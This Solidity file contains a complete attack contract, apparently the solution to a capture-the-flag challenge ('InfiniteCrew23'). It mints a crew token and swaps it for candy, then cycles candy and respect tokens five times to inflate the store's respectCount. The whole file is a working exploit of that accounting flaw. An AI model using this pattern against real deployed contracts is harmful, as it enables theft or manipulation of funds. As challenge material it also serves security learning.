// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CandyToken.sol";
import "./RespectToken.sol";
import "./CrewToken.sol";
import "./LocalGang.sol";
import "./FancyStore.sol";
import "./Setup.sol";

contract InfiniteCrew23Attack {
    function attack(address target) public {
        SetupInfiniteCrew23 setup = SetupInfiniteCrew23(target);
        LocalGangCrew23 lg = setup.GANG();
        FancyStoreCrew23 fs = setup.STORE();
        CrewTokenCrew23 crew = setup.CREW();
        RespectTokenCrew23 respect = setup.RESPECT();
        CandyTokenCrew23 candy = setup.CANDY();

        crew.mint(); // get 1 crew
        crew.approve(address(fs), 1);
        fs.verification();   // 1 crew -> 10 candy

        candy.approve(address(lg), 50);
        respect.approve(address(fs), 50);
        
        for (uint i; i < 5; i++) {
            lg.gainRespect(10);  // 10 candy -> 10 respect
            fs.buyCandies(10);  // 10 respect -> 10 candy, respectCount += 10
        }
    }
}